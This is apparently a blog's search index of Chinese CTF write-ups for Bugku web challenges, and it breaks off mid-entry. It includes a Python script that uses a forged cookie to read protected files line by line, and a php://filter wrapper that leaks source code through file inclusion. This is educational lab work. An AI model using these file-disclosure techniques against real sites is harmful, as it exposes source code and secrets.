<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>cookies欺骗</title>
    <url>/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/cookies%E6%AC%BA%E9%AA%97/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/cookies%E6%AC%BA%E9%AA%97/1.png" class="">

<p>题干说是cookies欺骗，看来这题跟cookie关系很大</p>
<a id="more"></a>

<img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/cookies%E6%AC%BA%E9%AA%97/2.png" class="">

<h2 id="冷静分析"><a href="#冷静分析" class="headerlink" title="冷静分析"></a>冷静分析</h2><p>&emsp;&emsp;首先注意到index.php会自动重定向，增加了两个参数：line和filename，从字面意思可以判断是读取某个文件的某行</p>
<p>同时filename参数是base64编码的，尝试一下修改line的值，发现line是索引，也就是说输入0则输出第一行</p>
<h2 id="开始尝试"><a href="#开始尝试" class="headerlink" title="开始尝试"></a>开始尝试</h2><p>尝试读取index.php的内容，手工试可能会累死，上脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定文件名为index.php(base64编码后)</span></span><br><span class="line">url = <span class="string">&quot;http://123.206.87.240:8002/web11/index.php?line=&#123;&#125;&amp;filename=aW5kZXgucGhw&quot;</span></span><br><span class="line"></span><br><span class="line">line = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">file = open(<span class="string">&#x27;index.php&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    http = requests.get(url=url.format(line))</span><br><span class="line">    <span class="keyword">if</span> http.text == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        file.write(http.text)</span><br><span class="line"></span><br><span class="line">    line += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>index.php源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 提取filename和line参数值(如果存在)</span></span><br><span class="line"></span><br><span class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;filename&#x27;</span>])?$_GET[<span class="string">&#x27;filename&#x27;</span>]:<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">&#x27;line&#x27;</span>])?intval($_GET[<span class="string">&#x27;line&#x27;</span>]):<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果文件名为空则重定向</span></span><br><span class="line"><span class="keyword">if</span>($file==<span class="string">&#x27;&#x27;</span>) header(<span class="string">&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设定读取的文件白名单</span></span><br><span class="line">$file_list = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;0&#x27;</span> =&gt;<span class="string">&#x27;keys.txt&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1&#x27;</span> =&gt;<span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 如果cookie中存在margin字段并且值为margin则将keys.php添加进白名单</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;margin&#x27;</span>]) &amp;&amp; $_COOKIE[<span class="string">&#x27;margin&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>) &#123;</span><br><span class="line">	$file_list[<span class="number">2</span>]=<span class="string">&#x27;keys.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 如果文件名在白名单之内则读取指定行并输出</span></span><br><span class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</span><br><span class="line">    $fa = file($file);</span><br><span class="line">    <span class="keyword">echo</span> $fa[$line];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>跟预想的差不多，就是多了一个文件白名单，果断修改cookie绕过</p>
<p>修改脚本内容：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定文件名为keys.php(base64编码后)</span></span><br><span class="line">url = <span class="string">&quot;http://123.206.87.240:8002/web11/index.php?line=&#123;&#125;&amp;filename=a2V5cy5waHA=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加cookie</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;cookie&#x27;</span>: <span class="string">&#x27;margin=margin&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">file = open(<span class="string">&quot;keys.php&quot;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">line = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    http = requests.get(url=(url.format(line)), headers=headers)</span><br><span class="line">    <span class="keyword">if</span> http.text == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        file.write(http.text)</span><br><span class="line"></span><br><span class="line">    line += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>运行一下，得到结果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $key=<span class="string">&#x27;KEY&#123;key_keys&#125;&#x27;</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>拿到flag</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>此题考查代码编写能力和手动测试能力(比如line参数))</p>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>flag在index里</title>
    <url>/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/flag%E5%9C%A8index%E9%87%8C/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/flag%E5%9C%A8index%E9%87%8C/1.png" class="">

<p>平平淡淡，只有一个链接</p>
<a id="more"></a>

<h2 id="探寻真相"><a href="#探寻真相" class="headerlink" title="探寻真相"></a>探寻真相</h2><p>首先看看源码</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/flag%E5%9C%A8index%E9%87%8C/2.png" class="">

<p>这一段像极了文件包含，分析一下：index从GET参数中提取file参数值并且包含file</p>
<p>这时候问题就来了：flag在index里，同时文件包含也是idnex发起的，如果修改file为index的话就会出现无限包含直至脚本生命周期结束，而且一般文件包含都会写在源码最前面，所以无法看到之后的内容，这该如何是好呢？</p>
<h2 id="灵光初现"><a href="#灵光初现" class="headerlink" title="灵光初现"></a>灵光初现</h2><p>正当脑壳痛的时候脑海里突然浮现一句话：有文件包含的地方就要想想伪协议</p>
<p>打开笔记翻出伪协议的记载，copy过来：php://filter/convert.base64-encode/resource=index.php</p>
<p>说明：对文件内容进行base64编码是因为部分特殊字符不会显示进而影响最终答案</p>
<img src="/2020/09/07/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/flag%E5%9C%A8index%E9%87%8C/3.png" class="">

<p>拿下index源码，base64解码就可得到最终答案</p>
<h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><p>学而不练则白费，看见了文件包含却又忘了伪协议</p>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>web3</title>
    <url>/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web3/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web3/1.png" class="">

<a id="more"></a>

<img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web3/2.png" class="">

<p>无限循环了，没办法看看源码吧</p>
<h2 id="寻找线索"><a href="#寻找线索" class="headerlink" title="寻找线索"></a>寻找线索</h2><p>打开BP抓包重放，此处需要注意一个细节</p>
<img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web3/3.png" class="">

<p>细节传送门：<a href="https://www.cnblogs.com/scmath/p/11179207.html" alt="LMS" target="LMS">LMS</a></p>
<p>为了消除缓存的影响，可以把数据包发送到repeater中删除LMS字段</p>
<img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web3/4.png" class="">

<p>从源码中我们看到一段注释并且使用了HTMLencode，很是可疑</p>
<h2 id="突破束缚"><a href="#突破束缚" class="headerlink" title="突破束缚"></a>突破束缚</h2><p>将注释内容拷贝至解码器中看看是什么，在线解码器：<a href="http://tool.chinaz.com/tools/htmlencode.aspx" alt="在线解码" target="_blank">传送门</a></p>
<img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web3/5.png" class="">

<p>惊喜的发现就是最终的答案，完美收工</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>没有思路时想想CTF三剑客：看源码、看响应、扫目录</p>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>WEB2</title>
    <url>/2020/09/03/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web2/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/03/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web2/1.png" class="">

<a id="more"></a>

<p>迎面而来的滑稽，是否让你感到了无所适从？</p>
<p>NO慌  <strong>↓</strong></p>
<h2 id="解决之道"><a href="#解决之道" class="headerlink" title="解决之道"></a>解决之道</h2><p>CTF三剑客：</p>
<ul>
<li>看源码</li>
<li>看响应</li>
<li>扫目录</li>
</ul>
<p>先康康源码：</p>
<img src="/2020/09/03/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web2/2.png" class="">

<img src="/2020/09/03/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web2/3.png" class="">

<p>flag摆在了眼前，尽情拿走吧(就这？)</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>第一：勿以事小不在意，最基础的往往是最重要而且容易被忽略的</p>
<p>第二：掌握多种方法(比如上面查看源码的方式)</p>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>web4</title>
    <url>/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web4/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web4/1.png" class="">

<p>这么明显的让看源码，那就看看喽</p>
<a id="more"></a>

<h2 id="看源码"><a href="#看源码" class="headerlink" title="看源码"></a>看源码</h2><img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web4/2.png" class="">

<p>这是什么乱七八糟的……还好我们有浏览器这一神器，看我秀一波操作</p>
<img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web4/3.png" class="">

<p>Note：为什么最后一行没有连带执行eval而仅仅着重参数？因为eval是把数据当做代码执行，所以我们只需要关心执行的代码是什么就可以了</p>
<p>人类可读代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>BKCTF-WEB4<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        看看源代码？<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">checkSubmit</span>(<span class="params"></span>) </span>&#123; </span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> a = <span class="built_in">document</span>.getElementById(<span class="string">&quot;password&quot;</span>); </span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (<span class="string">&quot;undefined&quot;</span> != <span class="keyword">typeof</span> a) &#123; </span></span><br><span class="line"><span class="javascript">                    <span class="keyword">if</span> (<span class="string">&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;</span> == a.value) </span></span><br><span class="line"><span class="javascript">                        <span class="keyword">return</span> !<span class="number">0</span>; </span></span><br><span class="line"><span class="javascript">                    alert(<span class="string">&quot;Error&quot;</span>);</span></span><br><span class="line">                    a.focus(); </span><br><span class="line"><span class="javascript">                    <span class="keyword">return</span> !<span class="number">1</span> </span></span><br><span class="line">                &#125; </span><br><span class="line">            &#125;</span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;levelQuest&quot;</span>).onsubmit = checkSubmit;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;input&quot;</span> <span class="attr">name</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>翻译成人话：当password等于67d709b2b54aa2aa648cf6e87a7114f1时通过验证</p>
<p>知道了密码直接输入即可得到想要的答案</p>
<img src="/2020/09/06/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web4/4.png" class="">

<p>得到flag</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>善用工具可以大幅提高效率</p>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>web5</title>
    <url>/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web5/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web5/1.png" class="">

<p>平凡中又透露着奇特</p>
<a id="more"></a>

<h2 id="尝试突破"><a href="#尝试突破" class="headerlink" title="尝试突破"></a>尝试突破</h2><p>随便提交之后有个提示</p>
<img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web5/2.png" class="">

<p>您是想让我看什么呢？也就源码、响应和目录了呗</p>
<p>看看源码：</p>
<img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web5/3.png" class="">

<p>不看不知道，一看吓一跳，JS混淆(具体名字忘了)都出来了</p>
<p>别被他吓着，把让你看不懂的符号集体ctrl+c带走扔进console，你会回来感谢我的</p>
<p>不知道怎么玩的同学请跟我学：用手指(说自己没手的用头)按一下F12</p>
<img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web5/4.png" class="">

<p>得到了一串不可描述的东西，提交一下试试</p>
<img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web5/5.png" class="">

<p>恩？？？什么叫很接近了？？？？</p>
<h2 id="陷入迷茫"><a href="#陷入迷茫" class="headerlink" title="陷入迷茫"></a>陷入迷茫</h2><p>&emsp;&emsp;无论我怎么鼓捣他就是不好使，感觉整个人都不好了，万般无奈之下……………….换下一道题吧。</p>
<h2 id="阴差阳错"><a href="#阴差阳错" class="headerlink" title="阴差阳错"></a>阴差阳错</h2><p>&emsp;&emsp;虽说我是被迫(太菜了)放弃但是我又有点不甘心，于是又点开了题目，也就是这一点，让我永远无法忘却的一幕发生了</p>
<img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web5/6.png" class="">

<p>这就是不看题自以为是的下场，真好（标准而又正宗的笑脸），不过还好我不服输(不肯承认自己FIVE)</p>
<h2 id="再战沙场"><a href="#再战沙场" class="headerlink" title="再战沙场"></a>再战沙场</h2><p>将JS反混淆后的字符串全部转换为大写再次输入</p>
<img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web5/7.png" class="">

<p>Note：正常情况下输入框会自动清空，为了便于对比手动添加的内容</p>
<p>你就算给我吹爆了(而且感觉怪怪的)也不给我flag</p>
<p>后续又尝试了：ctf{WHATFK}也不对，究竟是什么呢？</p>
<h2 id="灵光一闪"><a href="#灵光一闪" class="headerlink" title="灵光一闪"></a>灵光一闪</h2><p>既然刚才是看了眼题目跳出坑来，那么再看一眼吧</p>
<img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web5/8.png" class=""><img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web5/9.png" class="">

<p>MD，思维定势害死人，题目和页面都提示了就是没意识到</p>
<p>最终答案就是：CTF{WHATFK}</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>不看题，自以为是，思维定势害死人</p>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>web基础$_GET</title>
    <url>/2020/09/04/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web%E5%9F%BA%E7%A1%80$_GET/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/04/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web%E5%9F%BA%E7%A1%80$_GET/1.png" class="">

<p>原来是一道源码审计（doge）</p>
<a id="more"></a>

<h2 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$what=$_GET[<span class="string">&#x27;what&#x27;</span>]; <span class="comment">// 读取名为what的GET参数值</span></span><br><span class="line"><span class="keyword">echo</span> $what; <span class="comment">// 输出参数值</span></span><br><span class="line"><span class="keyword">if</span>($what==<span class="string">&#x27;flag&#x27;</span>) <span class="comment">// 如果参数值等于&quot;flag&quot;则输出flag</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;flag&#123;****&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>结论：当GET参数what的值等于flag时，输出答案</p>
<h2 id="剑指偏锋"><a href="#剑指偏锋" class="headerlink" title="剑指偏锋"></a>剑指偏锋</h2><p>本题难度较低，故直接给出payload：</p>
<p><a href="http://123.206.87.240:8002/get/?what=flag">http://123.206.87.240:8002/get/?what=flag</a></p>
<img src="/2020/09/04/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web%E5%9F%BA%E7%A1%80$_GET/2.png" class="">

<p>得到flag</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本题主要考察$_GET超变量及其如何通过GET方式传递参数，虽然简单但是很有意义</p>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>web基础$_POST</title>
    <url>/2020/09/04/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web%E5%9F%BA%E7%A1%80$_POST/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/04/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web%E5%9F%BA%E7%A1%80$_POST/1.png" class="">

<p>跟上一道题一样，又是一道源码审计（doge）</p>
<a id="more"></a>

<h2 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$what=$_POST[<span class="string">&#x27;what&#x27;</span>]; <span class="comment">// 读取名为what的POST参数值</span></span><br><span class="line"><span class="keyword">echo</span> $what; <span class="comment">// 输出参数值</span></span><br><span class="line"><span class="keyword">if</span>($what==<span class="string">&#x27;flag&#x27;</span>) <span class="comment">// 如果参数值等于&quot;flag&quot;则输出flag</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;flag&#123;****&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>结论：当POST参数what的值等于flag时，输出答案</p>
<h2 id="误入泥潭"><a href="#误入泥潭" class="headerlink" title="误入泥潭"></a>误入泥潭</h2><p>这还不简单？看不起谁呢？BP截断发送repeater加参数一把梭不就OK了</p>
<img src="/2020/09/04/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web%E5%9F%BA%E7%A1%80$_POST/2.png" class="">

<p>哈？我&amp;（*%￥……&amp;，发生了什么，为什么不能输出flag？？？？？？？？？</p>
<p>心想肯定是BP出问题了，要么就是服务器坏了，换maxhackbar试试</p>
<img src="/2020/09/04/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web%E5%9F%BA%E7%A1%80$_POST/3.png" class="">

<p>这？？为什么就成了？？？？？</p>
<p><strong>注意：maxhackbar发送POST包会自动添加GET参数；为了避免干扰，在截图的时候删除了多余的参数</strong></p>
<h2 id="发现曙光"><a href="#发现曙光" class="headerlink" title="发现曙光"></a>发现曙光</h2><p>既然maxhackbar可以成功，那就用BP抓一下流量康康吧</p>
<img src="/2020/09/04/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web%E5%9F%BA%E7%A1%80$_POST/4.png" class="">

<p>仔细分析一下，草（两种植物），真是213了</p>
<hr>
<p>说明一下：Content-Type(字母大小写严格遵循此名称)头表示MIME类型，如果没有指定则POST数据无效</p>
<p>参考：<a href="https://www.cnblogs.com/klb561/p/10090540.html">https://www.cnblogs.com/klb561/p/10090540.html</a></p>
<p>Content-Type在今后会有更多的用途，请各位仔细学习</p>
<h2 id="再入战场"><a href="#再入战场" class="headerlink" title="再入战场"></a>再入战场</h2><p>既然知道了坑在哪里，重新修改数据包</p>
<img src="/2020/09/04/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web%E5%9F%BA%E7%A1%80$_POST/5.png" class="">

<p>发送数据包</p>
<img src="/2020/09/04/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/web%E5%9F%BA%E7%A1%80$_POST/6.png" class="">

<p>YES, 成功了，拿下flag</p>
<h2 id="再入泥潭"><a href="#再入泥潭" class="headerlink" title="再入泥潭"></a>再入泥潭</h2><p>兴高采烈的提交flag它却告诉我不正确，嗯？？？？？</p>
<p>回头重新审视了一下，原来第一次输出的参数值和第二次的flag重叠了</p>
<h2 id="突破天际"><a href="#突破天际" class="headerlink" title="突破天际"></a>突破天际</h2><p>解决这个小问题之后，flag完美提交</p>
<h2 id="总结和反思"><a href="#总结和反思" class="headerlink" title="总结和反思"></a>总结和反思</h2><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li>本题主要考察了$_POST超变量和POST请求</li>
<li>POST请求忘记了添加Content-Type导致数据无法被正确解析</li>
<li>被一点小甜头冲昏了头脑</li>
</ul>
<h3 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h3><ul>
<li>扎实的基础很重要</li>
<li>保持冷静，仔细分析，不要遗漏线索</li>
</ul>
]]></content>
      <categories>
        <category>CTF-Bugku(旧版)-WEB</category>
      </categories>
      <tags>
        <tag>CTF-WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>你必须让他停下</title>
    <url>/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E4%BD%A0%E5%BF%85%E9%A1%BB%E8%AE%A9%E4%BB%96%E5%81%9C%E4%B8%8B/</url>
    <content><![CDATA[<h2 id="开卷看题"><a href="#开卷看题" class="headerlink" title="开卷看题"></a>开卷看题</h2><img src="/2020/09/05/CTF/WEB/Bugku(%E6%97%A7%E7%89%88)/%E4%BD%A0%E5%BF%85%E9%A1%BB%E8%AE%A9%E4%BB%96%E5%81%9C%E4%B8%8B/1.png" class="">

<p>页面自动刷新，无穷尽。。。这该如何是好</p>
<a id="more"></a>

<h2 id="探索历程"><a href="#探索历程" class="headerlink" title="探索历程"></a>探索历程</h2><p>遇事不决看源码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;description&quot;</span> <span class="attr">content</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;author&quot;</span> <span class="attr">content</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Dummy game<span class="tag">&lt;/<span class="name">title</span>&gt;</span> <span class="comment">&lt;!-- 笨蛋游戏(怎么感觉被侮辱了) --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;JavaScript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 刷新页面</span></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">myrefresh</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.location.reload();</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="built_in">setTimeout</span>(<span class="string">&#x27;myrefresh()&#x27;</span>, <span class="number">500</span>); </span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>I want to play Dummy game with others£¡But I can&#x27;t stop!<span class="tag">&lt;/<span class="name">strong</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">center</span>&gt;</span>Stop at panda ! u will get flag<span class="tag">&lt;/<span class="name">center</span>&gt;</span> <span class="comment">&lt;!-- 意思让在熊猫处停下就可以获得flag --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1.jpg&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span>&gt;</span>flag is here~<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="comment">&lt;!-- 这里应该是flag --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 